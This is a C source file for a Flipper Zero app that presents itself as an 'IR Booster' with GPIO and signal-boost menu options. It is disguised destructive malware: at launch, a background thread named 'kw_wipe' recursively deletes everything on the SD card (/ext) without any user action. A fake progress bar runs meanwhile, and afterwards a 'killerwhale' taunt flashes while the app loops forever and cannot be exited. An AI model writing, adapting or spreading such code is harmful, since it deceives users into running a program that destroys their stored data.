#include <furi.h>
#include <gui/gui.h>
#include <gui/view_port.h>
#include <gui/canvas.h>
#include <input/input.h>
#include <storage/storage.h>
#include <notification/notification.h>
#include <notification/notification_messages.h>
#include <stdlib.h>

#include "killerwhale.xbm"

#define TICK_MS           50
#define SHOW_MIN_MS       120
#define SHOW_MAX_MS       220
#define BLACK_MIN_MS      120
#define BLACK_MAX_MS      200

typedef enum { BlackFull, BlackTop, BlackBottom } BlackType;
typedef enum { PhaseMenu, PhaseProgress, PhaseAnim } Phase;

static inline uint32_t ms2t(uint32_t ms){ return furi_ms_to_ticks(ms); }
static inline uint32_t rndu(uint32_t a, uint32_t b){ return a + (uint32_t)(rand() % (int)(b - a + 1)); }

static void draw_xbm_invert(Canvas* c, int x, int y, uint8_t w, uint8_t h, const uint8_t* data){
    const size_t bytes = ((w + 7) / 8) * h;
    static uint8_t buf[((128 + 7) / 8) * 64];
    for(size_t i = 0; i < bytes; i++) buf[i] = (uint8_t)~data[i];
    canvas_draw_xbm(c, x, y, w, h, buf);
}

typedef struct {
    Gui* gui;
    ViewPort* vp;
    FuriTimer* timer;
    FuriThread* worker;
    NotificationApp* ntf;

    uint8_t menu_index;
    uint8_t gpio_index;
    bool    boost;

    uint8_t  progress;
    uint32_t next_progress_tick;


    Phase phase;
    bool whale_left;
    bool in_black;
    BlackType black_type;
    uint32_t next_tick;

    volatile bool wiping;
    volatile bool wiped_ok;
} App;

static const char* k_gpio_opts[] = { "PA7", "PB0", "PB3", "PC1", "PC3" };
static const uint8_t k_gpio_opts_count = sizeof(k_gpio_opts)/sizeof(k_gpio_opts[0]);

static void schedule_show(App* a){
    a->in_black = false;
    a->next_tick = furi_get_tick() + ms2t(rndu(SHOW_MIN_MS, SHOW_MAX_MS));
}
static void schedule_black(App* a){
    a->in_black = true;
    a->black_type = (BlackType)rndu(0, 2);
    a->next_tick = furi_get_tick() + ms2t(rndu(BLACK_MIN_MS, BLACK_MAX_MS));
}

static void draw_menu(Canvas* canvas, const App* a){
    canvas_clear(canvas);
    canvas_set_color(canvas, ColorBlack);


    canvas_set_font(canvas, FontPrimary);
    const char* title = "IR Booster";
    int tx = (128 - (int)canvas_string_width(canvas, title))/2;
    if(tx < 0) tx = 0;
    canvas_draw_str(canvas, tx, 12, title);


    canvas_set_font(canvas, FontSecondary);


    bool sel0 = (a->menu_index == 0);
    canvas_draw_str(canvas, 6, 26, sel0 ? "> Select GPIO" : "  Select GPIO");
    char buf0[16];
    snprintf(buf0, sizeof(buf0), "[%s]", k_gpio_opts[a->gpio_index % k_gpio_opts_count]);
    int v0x = 128 - (int)canvas_string_width(canvas, buf0) - 6;
    canvas_draw_str(canvas, v0x, 26, buf0);


    bool sel1 = (a->menu_index == 1);
    canvas_draw_str(canvas, 6, 38, sel1 ? "> Increase Signal" : "  Increase Signal");
    const char* v1 = a->boost ? "[ON]" : "[OFF]";
    int v1x = 128 - (int)canvas_string_width(canvas, v1) - 6;
    canvas_draw_str(canvas, v1x, 38, v1);


    bool sel2 = (a->menu_index == 2);
    canvas_draw_str(canvas, 6, 52, sel2 ? "> Start Processing" : "  Start Processing");
}

static void draw_progress(Canvas* canvas, const App* a){
    canvas_clear(canvas);
    canvas_set_color(canvas, ColorBlack);


    canvas_set_font(canvas, FontSecondary);
    const char* hdr = "Processing...";
    int hx = (128 - (int)canvas_string_width(canvas, hdr))/2;
    if(hx < 0) hx = 0;
    canvas_draw_str(canvas, hx, 14, hdr);


    char pbuf[8];
    snprintf(pbuf, sizeof(pbuf), "%u%%", (unsigned)a->progress);
    canvas_set_font(canvas, FontPrimary);
    int px = (128 - (int)canvas_string_width(canvas, pbuf))/2;
    if(px < 0) px = 0;
    canvas_draw_str(canvas, px, 40, pbuf);


    int bar_w = 100;
    int bar_x = (128 - bar_w)/2;
    int filled = (bar_w * a->progress) / 100;
    canvas_draw_frame(canvas, bar_x, 48, bar_w, 10);
    if(filled > 0) canvas_draw_box(canvas, bar_x+1, 49, filled-2 > 0 ? filled-2 : 0, 8);
}

static void draw_anim(Canvas* canvas, const App* a){
    canvas_clear(canvas);
    canvas_set_color(canvas, ColorBlack);

    if(a->in_black){
        if(a->black_type == BlackFull)      canvas_draw_box(canvas, 0, 0, 128, 64);
        else if(a->black_type == BlackTop)  canvas_draw_box(canvas, 0, 0, 128, 32);
        else                                canvas_draw_box(canvas, 0, 32, 128, 32);
        return;
    }


    const int iw = killerwhale_width;
    const int ih = killerwhale_height;
    const int whale_x = a->whale_left ? 0 : (128 - iw);
    draw_xbm_invert(canvas, whale_x, 0, iw, ih, (const uint8_t*)killerwhale_bits);


    const int text_x = a->whale_left ? iw : 0;
    const int text_w = 128 - iw;

    canvas_set_font(canvas, FontPrimary);
    const char* big = "K.W";
    int bx = text_x + (text_w - (int)canvas_string_width(canvas, big)) / 2;
    int by = 30;
    canvas_draw_str(canvas, bx, by, big);

    canvas_set_font(canvas, FontSecondary);
    const char* small = "killerwhale";
    int sx = text_x + (text_w - (int)canvas_string_width(canvas, small)) / 2;
    int sy = by + 18; if(sy > 62) sy = 62;
    canvas_draw_str(canvas, sx, sy, small);
}

static void draw_cb(Canvas* canvas, void* ctx){
    App* a = ctx;
    if(a->phase == PhaseMenu)      draw_menu(canvas, a);
    else if(a->phase == PhaseProgress) draw_progress(canvas, a);
    else                           draw_anim(canvas, a);
}

static void input_cb(InputEvent* e, void* ctx){
    App* a = ctx;

    if(a->phase != PhaseMenu) return;
    if(e->type != InputTypeShort && e->type != InputTypeRepeat) return;

    switch(e->key){
        case InputKeyUp:    if(a->menu_index > 0) a->menu_index--; break;
        case InputKeyDown:  if(a->menu_index < 2) a->menu_index++; break;
        case InputKeyLeft:
            if(a->menu_index == 0){
                a->gpio_index = (a->gpio_index + k_gpio_opts_count - 1) % k_gpio_opts_count;
            }else if(a->menu_index == 1){
                a->boost = !a->boost;
            }
            break;
        case InputKeyRight:
        case InputKeyOk:
            if(a->menu_index == 0){
                a->gpio_index = (a->gpio_index + 1) % k_gpio_opts_count;
            }else if(a->menu_index == 1){
                a->boost = !a->boost;
            }else{

                a->phase = PhaseProgress;
                a->progress = 0;
                a->next_progress_tick = furi_get_tick() + ms2t(2000);
            }
            break;
        default: break;
    }
    view_port_update(a->vp);
}


static void wipe_ext(Storage* storage){
    File* dir = storage_file_alloc(storage);
    if(!storage_dir_open(dir, "/ext")){
        storage_file_free(dir);
        return;
    }
    FileInfo info;
    char name[256];
    while(storage_dir_read(dir, &info, name, sizeof(name))){
        if(name[0]=='.' && (name[1]=='\0' || (name[1]=='.' && name[2]=='\0'))) continue;
        char path[512];
        snprintf(path, sizeof(path), "/ext/%s", name);
        storage_simply_remove_recursive(storage, path);
    }
    storage_dir_close(dir);
    storage_file_free(dir);
}


static int32_t worker_entry(void* ctx){
    App* a = ctx;
    a->wiping = true;
    a->wiped_ok = false;

    Storage* storage = furi_record_open(RECORD_STORAGE);
    if(storage){
        wipe_ext(storage);
        furi_record_close(RECORD_STORAGE);
        a->wiped_ok = true;
    }
    a->wiping = false;
    return 0;
}

static void timer_cb(void* ctx){
    App* a = ctx;

    if(a->phase == PhaseAnim){

        if(furi_get_tick() >= a->next_tick){
            if(a->in_black){
                a->whale_left = !a->whale_left;
                schedule_show(a);
            }else{
                schedule_black(a);
            }
            view_port_update(a->vp);
        }
        return;
    }

    if(a->phase == PhaseProgress){
        const uint32_t now = furi_get_tick();


        if(a->progress < 100 && now >= a->next_progress_tick){
            a->progress++;
            a->next_progress_tick = now + ms2t(2000);
            view_port_update(a->vp);
        }


        if(a->wiped_ok){
            a->phase = PhaseAnim;
            schedule_show(a);
            view_port_update(a->vp);


            notification_message(a->ntf, &sequence_blink_red_100);
        }
        return;
    }


}

int32_t killerwhale_app(void* p){
    UNUSED(p);

    App app = {0};
    app.phase = PhaseMenu;
    app.whale_left = true;
    app.menu_index = 0;
    app.gpio_index = 0;
    app.boost = false;

    srand((unsigned)furi_get_tick());

    app.gui = furi_record_open(RECORD_GUI);
    app.ntf = furi_record_open(RECORD_NOTIFICATION);

    app.vp = view_port_alloc();
    view_port_draw_callback_set(app.vp, draw_cb, &app);
    view_port_input_callback_set(app.vp, input_cb, &app);
    gui_add_view_port(app.gui, app.vp, GuiLayerFullscreen);
    view_port_update(app.vp);

    app.timer = furi_timer_alloc(timer_cb, FuriTimerTypePeriodic, &app);
    furi_timer_start(app.timer, TICK_MS);


    app.worker = furi_thread_alloc_ex("kw_wipe", 2048, worker_entry, &app);
    furi_thread_start(app.worker);


    while(true) {
        furi_delay_ms(20);
    }


    furi_thread_join(app.worker);
    furi_thread_free(app.worker);
    furi_timer_stop(app.timer);
    furi_timer_free(app.timer);
    gui_remove_view_port(app.gui, app.vp);
    view_port_free(app.vp);
    furi_record_close(RECORD_NOTIFICATION);
    furi_record_close(RECORD_GUI);
    return 0;
}
